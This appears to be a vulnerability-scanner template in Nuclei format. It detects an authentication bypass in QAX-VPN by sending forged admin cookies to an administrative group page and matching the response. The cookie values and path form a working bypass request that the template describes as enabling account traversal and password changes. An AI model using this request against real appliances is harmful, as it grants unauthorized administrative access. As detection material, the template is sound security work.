http:
- headers:
    Cookie: admin_id=1; gw_admin_ticket=1;
  matchers:
  - part: body
    type: word
    words:
    - javascript:RemoveUserFromList()
  method: GET
  path:
  - '{{BaseURL}}/admin/group/x_group.php?id=1'
id: unauthenticated-qax-vpn-access
info:
  author: unknwon
  description: QAX-VPN has unauthorized management user traversal and any account
    password modification.
  metadata:
    max-request: 1
  name: QAX-VPN - Authentication Bypass
  reference:
  - https://mp.weixin.qq.com/s/BlXK_EB6ImceX83MIJGKsA
  severity: critical
  tags: qan-vpn,unauth
